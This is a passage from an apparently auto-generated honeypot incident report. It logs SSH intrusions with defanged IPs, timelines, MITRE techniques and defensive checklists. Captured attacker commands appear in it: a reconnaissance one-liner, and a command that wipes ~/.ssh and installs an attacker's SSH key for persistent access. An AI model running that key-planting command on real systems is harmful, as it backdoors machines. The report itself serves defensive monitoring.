| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:47:02` | `cowrie.session.connect` |
| `2026-08-24 11:47:02` | `cowrie.client.version` |
| `2026-08-24 11:47:02` | `cowrie.client.kex` |
| `2026-08-24 11:47:04` | `cowrie.login.success` |
| `2026-08-24 11:47:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.204.245[.]220` to AbuseIPDB if not already reported
- [ ] Block `176.204.245[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afeae3648582

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 11:47 |
| **Last Seen** | 2026-08-24 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:47:04` | `cowrie.session.connect` |
| `2026-08-24 11:47:04` | `cowrie.client.version` |
| `2026-08-24 11:47:04` | `cowrie.client.kex` |
| `2026-08-24 11:47:04` | `cowrie.login.success` |
| `2026-08-24 11:47:04` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:47:04` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edce602eb3b7

| Field | Detail |
|---|---|
| **Source IP** | `65.20.198[.]159` |
| **First Seen** | 2026-08-24 11:47 |
| **Last Seen** | 2026-08-24 11:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:47:11` | `cowrie.session.connect` |
| `2026-08-24 11:47:12` | `cowrie.client.version` |
| `2026-08-24 11:47:12` | `cowrie.client.kex` |
| `2026-08-24 11:47:13` | `cowrie.login.success` |
| `2026-08-24 11:47:13` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.198[.]159` to AbuseIPDB if not already reported
- [ ] Block `65.20.198[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e72052c3af0

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-08-24 11:51 |
| **Last Seen** | 2026-08-24 11:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:51:50` | `cowrie.session.connect` |
| `2026-08-24 11:51:51` | `cowrie.client.version` |
| `2026-08-24 11:51:51` | `cowrie.client.kex` |
| `2026-08-24 11:51:53` | `cowrie.login.success` |
| `2026-08-24 11:51:54` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22bda537819b

| Field | Detail |
|---|---|
| **Source IP** | `122.187.235[.]148` |
| **First Seen** | 2026-08-24 11:51 |
| **Last Seen** | 2026-08-24 11:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:51:59` | `cowrie.session.connect` |
| `2026-08-24 11:52:00` | `cowrie.client.version` |
| `2026-08-24 11:52:00` | `cowrie.client.kex` |
| `2026-08-24 11:52:02` | `cowrie.login.success` |
| `2026-08-24 11:52:03` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.235[.]148` to AbuseIPDB if not already reported
- [ ] Block `122.187.235[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4762e4eda165

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:52 |
| **Last Seen** | 2026-08-24 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:52:48` | `cowrie.session.connect` |
| `2026-08-24 11:52:48` | `cowrie.client.version` |
| `2026-08-24 11:52:48` | `cowrie.client.kex` |
| `2026-08-24 11:52:49` | `cowrie.login.success` |
| `2026-08-24 11:52:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:52:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:52:50` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7c794edd8f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:52 |
| **Last Seen** | 2026-08-24 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:52:52` | `cowrie.session.connect` |
| `2026-08-24 11:52:52` | `cowrie.client.version` |
| `2026-08-24 11:52:52` | `cowrie.client.kex` |
| `2026-08-24 11:52:53` | `cowrie.login.success` |
| `2026-08-24 11:52:53` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:52:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:52:53` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c77ef9bcf5a

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]53` |
| **First Seen** | 2026-08-24 11:57 |
| **Last Seen** | 2026-08-24 11:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:57:03` | `cowrie.session.connect` |
| `2026-08-24 11:57:04` | `cowrie.client.version` |
| `2026-08-24 11:57:04` | `cowrie.client.kex` |
| `2026-08-24 11:57:05` | `cowrie.login.success` |
| `2026-08-24 11:57:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]53` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df009b7a6381

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-08-24 11:57 |
| **Last Seen** | 2026-08-24 11:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:57:10` | `cowrie.session.connect` |
| `2026-08-24 11:57:11` | `cowrie.client.version` |
| `2026-08-24 11:57:11` | `cowrie.client.kex` |
| `2026-08-24 11:57:12` | `cowrie.login.success` |
| `2026-08-24 11:57:12` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46881dd7b8e6

| Field | Detail |
|---|---|
| **Source IP** | `112.31.167[.]120` |
| **First Seen** | 2026-08-24 11:57 |
| **Last Seen** | 2026-08-24 11:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:57:19` | `cowrie.session.connect` |
| `2026-08-24 11:57:20` | `cowrie.client.version` |
| `2026-08-24 11:57:20` | `cowrie.client.kex` |
| `2026-08-24 11:57:24` | `cowrie.login.success` |
| `2026-08-24 11:57:24` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.167[.]120` to AbuseIPDB if not already reported
- [ ] Block `112.31.167[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a43e80b89333

| Field | Detail |
|---|---|
| **Source IP** | `124.239.169[.]52` |
| **First Seen** | 2026-08-24 11:57 |
| **Last Seen** | 2026-08-24 11:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:57:31` | `cowrie.session.connect` |
| `2026-08-24 11:57:33` | `cowrie.client.version` |
| `2026-08-24 11:57:33` | `cowrie.client.kex` |
| `2026-08-24 11:57:37` | `cowrie.login.success` |
| `2026-08-24 11:57:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.169[.]52` to AbuseIPDB if not already reported
- [ ] Block `124.239.169[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-308a1ae91a7f

| Field | Detail |
|---|---|
| **Source IP** | `201.63.138[.]70` |
| **First Seen** | 2026-08-24 12:00 |
| **Last Seen** | 2026-08-24 12:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:00:31` | `cowrie.session.connect` |
| `2026-08-24 12:00:32` | `cowrie.client.version` |
| `2026-08-24 12:00:32` | `cowrie.client.kex` |
| `2026-08-24 12:00:34` | `cowrie.login.success` |
| `2026-08-24 12:00:34` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.138[.]70` to AbuseIPDB if not already reported
- [ ] Block `201.63.138[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe32ea20935

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]14` |
| **First Seen** | 2026-08-24 12:00 |
| **Last Seen** | 2026-08-24 12:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:00:40` | `cowrie.session.connect` |
| `2026-08-24 12:00:41` | `cowrie.client.version` |
| `2026-08-24 12:00:41` | `cowrie.client.kex` |
| `2026-08-24 12:00:43` | `cowrie.login.success` |
| `2026-08-24 12:00:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]14` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a7d02a1c7a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:01 |
| **Last Seen** | 2026-08-24 12:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:01:30` | `cowrie.session.connect` |
| `2026-08-24 12:01:30` | `cowrie.client.version` |
| `2026-08-24 12:01:30` | `cowrie.client.kex` |
| `2026-08-24 12:01:32` | `cowrie.login.success` |
| `2026-08-24 12:01:33` | `cowrie.session.params` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:33` | `cowrie.command.success` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:33` | `cowrie.command.input` |
| `2026-08-24 12:01:34` | `cowrie.log.closed` |
| `2026-08-24 12:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970bd8270692

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-08-24 12:02 |
| **Last Seen** | 2026-08-24 12:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:02:19` | `cowrie.session.connect` |
| `2026-08-24 12:02:19` | `cowrie.client.version` |
| `2026-08-24 12:02:19` | `cowrie.client.kex` |
| `2026-08-24 12:02:19` | `cowrie.login.success` |
| `2026-08-24 12:02:20` | `cowrie.session.params` |
| `2026-08-24 12:02:20` | `cowrie.command.input` |
| `2026-08-24 12:02:20` | `cowrie.command.failed` |
| `2026-08-24 12:02:21` | `cowrie.log.closed` |
| `2026-08-24 12:02:21` | `cowrie.session.params` |
| `2026-08-24 12:02:21` | `cowrie.command.input` |
| `2026-08-24 12:02:21` | `cowrie.session.file_download` |
| `2026-08-24 12:02:21` | `cowrie.log.closed` |
| `2026-08-24 12:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa890f434461

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-08-24 12:02 |
| **Last Seen** | 2026-08-24 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:02:22` | `cowrie.session.connect` |
| `2026-08-24 12:02:22` | `cowrie.client.version` |
| `2026-08-24 12:02:22` | `cowrie.client.kex` |
| `2026-08-24 12:02:22` | `cowrie.login.success` |
| `2026-08-24 12:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfd9faf4c985

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-08-24 12:02 |
| **Last Seen** | 2026-08-24 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:02:23` | `cowrie.session.connect` |
| `2026-08-24 12:02:23` | `cowrie.client.version` |
| `2026-08-24 12:02:23` | `cowrie.client.kex` |
| `2026-08-24 12:02:23` | `cowrie.login.success` |
| `2026-08-24 12:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc090c048ad

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:02 |
| **Last Seen** | 2026-08-24 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:02:24` | `cowrie.session.connect` |
| `2026-08-24 12:02:24` | `cowrie.client.version` |
| `2026-08-24 12:02:24` | `cowrie.client.kex` |
| `2026-08-24 12:02:25` | `cowrie.login.success` |
| `2026-08-24 12:02:26` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:02:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:02:26` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3276534f254b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:02 |
| **Last Seen** | 2026-08-24 12:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:02:29` | `cowrie.session.connect` |
| `2026-08-24 12:02:29` | `cowrie.client.version` |
| `2026-08-24 12:02:29` | `cowrie.client.kex` |
| `2026-08-24 12:02:31` | `cowrie.login.success` |
| `2026-08-24 12:02:31` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:02:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:02:31` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dfc6a6d8980

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:03 |
| **Last Seen** | 2026-08-24 12:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:03:05` | `cowrie.session.connect` |
| `2026-08-24 12:03:06` | `cowrie.client.version` |
| `2026-08-24 12:03:06` | `cowrie.client.kex` |
| `2026-08-24 12:03:08` | `cowrie.login.success` |
| `2026-08-24 12:03:09` | `cowrie.session.params` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:09` | `cowrie.command.success` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:09` | `cowrie.command.input` |
| `2026-08-24 12:03:10` | `cowrie.log.closed` |
| `2026-08-24 12:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bcda0393477

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:04 |
| **Last Seen** | 2026-08-24 12:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:04:42` | `cowrie.session.connect` |
| `2026-08-24 12:04:42` | `cowrie.client.version` |
| `2026-08-24 12:04:42` | `cowrie.client.kex` |
| `2026-08-24 12:04:44` | `cowrie.login.success` |
| `2026-08-24 12:04:46` | `cowrie.session.params` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.command.success` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.command.input` |
| `2026-08-24 12:04:46` | `cowrie.log.closed` |
| `2026-08-24 12:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772565839326

| Field | Detail |
|---|---|
| **Source IP** | `191.34.222[.]174` |
| **First Seen** | 2026-08-24 12:05 |
